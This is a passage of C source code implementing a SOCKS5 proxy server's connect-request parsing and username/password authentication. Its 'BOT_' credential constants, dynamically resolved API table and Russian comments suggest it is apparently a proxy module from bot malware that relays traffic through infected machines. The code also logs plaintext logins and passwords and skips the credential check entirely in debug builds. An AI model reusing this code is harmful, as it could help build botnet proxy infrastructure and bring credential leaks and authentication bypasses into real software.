BOOL SocksCheckMethod(PSOCKS_CONNECT sConnect,PSOCKS_CONNECT_REQUEST pConReq)
{
	struct timeval timeout;
	char *szDomName = NULL;
	fd_set fd;
	BOOL bRet = TRUE; 
	SOCKS_CONNECT_REQUEST sConReq = { 0 };
	DWORD dwRet = 0;
	PDNS_RECORD pQueryResultsSet = ALLOC(sizeof(DNS_RECORD));
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(sConnect->hClient, &fd);

	if(api.pselect(0, &fd, NULL, NULL, &timeout) == 0)
	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Error select");
#endif
		SEND_ERROR(SOCKS_REP_UNKNOWN,sConnect->hClient);
	}

	api.pSleep(100);
	// get version and cmd from client
	if(socks_RECV(sConnect->hClient,&sConReq,2,""/*"get Version and CMD"*/) != 2)
		SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);	

	// check socks version
	if(sConReq.Ver != 0x05 || sConReq.Cmd != SOCKS_METHOD_CONNECT)
		SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);

	// ++
	// check socks cmd
	//if(sConReq.Cmd != SOCKS_METHOD_CONNECT)
	//	SEND_ERROR(SOCKS_REP_CMD_ERROR,sConnect->hClient);

	// get rsv and atype 
	if(socks_RECV(sConnect->hClient,&sConReq.Rsv,2,""/*"Get Address type"*/) != 2)
		SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);
	
	switch(sConReq.Atyp)
	{
		// if SOCKS_ATYPE_IP4 - Ip is binary
		// if IP
		case SOCKS_ATYPE_IP4:{
			// получаем 4 байта IP адреса
			if( socks_RECV(sConnect->hClient,&sConnect->server_in.sin_addr,4,""/*"Get Dest IP addr"*/)  <= 0)
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);
			// получаем порт
			if ( socks_RECV ( sConnect->hClient, &sConnect->server_in.sin_port, 2 ,""/*"Get Dst Port"*/)  <= 0 )
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);

			//DbgPrint("--- Destination host IP : %d.%d.%d.%d:%d\n",sConnect->server_in.sin_addr.S_un.S_un_b.s_b1,sConnect->server_in.sin_addr.S_un.S_un_b.s_b2,sConnect->server_in.sin_addr.S_un.S_un_b.s_b3,sConnect->server_in.sin_addr.S_un.S_un_b.s_b4,htons(sConnect->server_in.sin_port));
			// копируем порт в структуру
			memcpy(&sConReq.Domain.szDomain[4],&sConnect->server_in.sin_port,2);
			break;
		}

		// if DNAME
		case SOCKS_ATYPE_DOMAINE:{
			// get domain name len
			if (socks_RECV(sConnect->hClient,&sConReq.Domain.DomNameLen,1,""/*"Get domain name length"*/) <= 0 )
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);
			
			dwRet = socks_RECV( sConnect->hClient,&sConReq.Domain.szDomain[1],(DWORD)sConReq.Domain.DomNameLen,""/*"Get domain name length"*/);
			if( dwRet <= 0 || dwRet < (DWORD)sConReq.Domain.DomNameLen )
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);

			if ( socks_RECV ( sConnect->hClient, &sConnect->server_in.sin_port, 2 ,""/*"Get Dst Port"*/)  <= 0 )
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);

			szDomName = ALLOC(sConReq.Domain.DomNameLen+1);
			if(!szDomName)
				SEND_ERROR(SOCKS_REP_ERROR,sConnect->hClient);


			memcpy(&sConReq.Domain.szDomain[sConReq.Domain.DomNameLen+1],&sConnect->server_in.sin_port,2);
			memcpy(szDomName,&sConReq.Domain.szDomain[1],sConReq.Domain.DomNameLen);

			//DbgPrint("--- Destination host : %s:%d\n--- Try resolve host name to ip..\n",szDomName,htons(sConnect->server_in.sin_port));
		
			resolve_hostname(szDomName,&sConnect->server_in.sin_addr.S_un.S_addr);
			//DbgPrint("--- Destination host IP : %d.%d.%d.%d:%d\n",sConnect->server_in.sin_addr.S_un.S_un_b.s_b1,sConnect->server_in.sin_addr.S_un.S_un_b.s_b2,sConnect->server_in.sin_addr.S_un.S_un_b.s_b3,sConnect->server_in.sin_addr.S_un.S_un_b.s_b4,htons(sConnect->server_in.sin_port));
			break;
		}

		default:{
			SEND_ERROR(SOCKS_REP_ADDR_ERROR,sConnect->hClient);
			break;
		}

	}

	sConnect->server_in.sin_family = AF_INET;
 end:
	return bRet;
}

BOOL SocksAuth(SOCKET hClient)
{
	SOCKS_AUTH sAuth;
 	BOOL bRet = FALSE;
	DWORD dwRet = 0;
	BYTE i;
	SOCKS_AUTH_RESP sAuthResp = { 0 };
	SOCKS_AUTH_REQ sAuthReq = { 0 };

	dwRet = socks_RECV(hClient, (char *)&sAuth, sizeof(SOCKS_AUTH),"");//"auth header");
	if(!dwRet)
	{
		SEND_ERROR(SOCKS_REP_ERROR,hClient);
		DbgMsg(__FILE__,__LINE__,"Error get socks auth bytes");
	}

	if(	sAuth.Ver != SOCKS_VERSION || sAuth.nMethods <= 0x00 || dwRet != (DWORD)sAuth.nMethods + 2 ) 
		goto not_auth; 

	for( i = 0; i < sAuth.nMethods; i++ )
	{
		if( sAuth.Methods[i] == SOCKS_AUTH_USERPASS )
			goto found;
	}
	
// no USER\PASS auth methods
not_auth:
	DbgMsg(__FILE__,__LINE__,"Error auth . Version %d, Methods %d is %d",sAuth.Ver,sAuth.nMethods,sAuth.Methods[sAuth.nMethods]);
	SEND_ERROR(SOCKS_AUTH_ERROR,hClient);

found:
	sAuthResp.Method = 0x02;
	sAuthResp.Ver = 0x05;
	socks_SEND(hClient,&sAuthResp,sizeof(SOCKS_AUTH_RESP),"Auth responce");//"auth response");

	api.pSleep(100);
	
	if(socks_RECV(hClient,&sAuthReq.Ver,1,""/*Client version*/))//"Client auth version"))
	{	// get auth method
		if(sAuthReq.Ver == 0x01)
		{	// check it if is 0x01 ( LOGIN & PASS )
			if(socks_RECV(hClient,&sAuthReq.LoginLen,1,""/*Get socks 5 login*/))//"Client login length"))
			{	// get login len
				if(sAuthReq.LoginLen > 0 && sAuthReq.LoginLen < 255)
				{	// check login len
					if(socks_RECV(hClient,(PVOID)&sAuthReq.szLogin,sAuthReq.LoginLen,""))//"client login"))
					{	// get login
						DbgMsg(__FILE__,__LINE__,"Login : %s",sAuthReq.szLogin);
						if(socks_RECV(hClient,&sAuthReq.PasswordLen,1,"Get password len"))//"client passwd len"))
						{	// get passwd len
							if(sAuthReq.PasswordLen > 0 && sAuthReq.PasswordLen < 255)
							{	// check passwd len
								if(socks_RECV(hClient,(PVOID)&sAuthReq.szPasswd,sAuthReq.PasswordLen,""/*Get client password*/))//"client passwd"))
								{	// get passwd
									DbgMsg(__FILE__,__LINE__,"Password : %s",sAuthReq.szPasswd);
									if(!SocksLogin(sAuthReq))
									{	// auth
										bRet = FALSE;
										sAuthResp.Ver	= 0x01;
										sAuthResp.Method= 0xFF;
										socks_SEND(hClient,&sAuthResp.Ver,2,"");//"auth error");
										goto end;
									}	else	{
										sAuthResp.Ver	= 0x01;
										sAuthResp.Method= 0x00;
										socks_SEND(hClient,&sAuthResp.Ver,2,"");//"auth succeful");
										bRet = TRUE;
										goto end;
									}
								}
							}
						}
					}
				}
			}//
		}
	}
	SEND_ERROR(SOCKS_AUTH_ERROR,hClient);
end:
	return bRet;
}

BOOL SocksLogin(SOCKS_AUTH_REQ sAReq)
{
#ifndef _DEBUG_
	if(	pUserInfo->bLoginLength != sAReq.LoginLen			||
		pUserInfo->bPasswLength != sAReq.PasswordLen		||
		memcmp( pUserInfo->szLogin, sAReq.szLogin , BOT_LOGIN_LEN) != 0	||
		memcmp( pUserInfo->szPassword, sAReq.szPasswd, BOT_PASSW_LEN) != 0	)
		return FALSE;
#endif
	return TRUE;
}